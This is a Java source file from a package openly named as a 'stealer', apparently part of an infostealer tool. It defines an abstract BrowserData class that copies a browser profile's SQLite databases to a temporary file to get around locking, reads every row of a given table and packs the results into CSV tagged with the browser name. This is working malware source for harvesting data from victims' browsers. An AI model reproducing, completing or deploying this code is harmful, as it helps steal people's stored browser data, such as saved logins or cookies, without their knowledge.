package com.github.shurpe.stealer.utils.browser.data;

import com.github.shurpe.stealer.utils.browser.BrowserProfile;
import com.github.shurpe.stealer.utils.Utils;

import java.io.File;
import java.io.IOException;
import java.sql.*;
import java.util.List;

public abstract class BrowserData {

	private final BrowserProfile profile;
	private final String sqlTableName;
	private final	File file;

	public BrowserData(final BrowserProfile profile, final String filePath,
							 final String sqlTableName) {
		this.profile = profile;
		this.sqlTableName = sqlTableName;
		file = new File(profile.getDirectory(), filePath);
	}

	public void findResultSets() {
		if (!file.exists()) {
			return;
		}

		File temp = null;

		try {
			// Makes a temporary copy of the database to avoid SQLite locking
			temp = Utils.copyToTemp(file);

			try (Connection connection = DriverManager.getConnection("jdbc:sqlite:" + temp);
				  Statement statement = connection.createStatement();
				  ResultSet rs = statement.executeQuery("SELECT * FROM " + sqlTableName)) {

				while (rs.next()) {
					onResultSetFound(rs);
				}
			}
		} catch (SQLException | IOException e) {
			e.printStackTrace();
		} finally {

			// Deletes a temporary copy of the database
			if (temp != null) {
				temp.delete();
			}
		}
	}

	public final <T extends Data> String toCsvColumn(List<T> data) {
		final String browserName = this.getProfile().getBrowser().getInfo().getBrowserName();
		final StringBuilder stringBuilder = new StringBuilder();

		for (final T element : data) {
			stringBuilder.append('\"').append(browserName).append("\",");
			stringBuilder.append(element.toCsvColumn());
		}

		return stringBuilder.toString();
	}

	public abstract String toCsvColumn();

	public BrowserProfile getProfile() {
		return profile;
	}

	public File getFile() {
		return file;
	}

	public abstract void onResultSetFound(final ResultSet rs);

	protected static abstract class Data {

		public abstract String toCsvColumn();
	}
}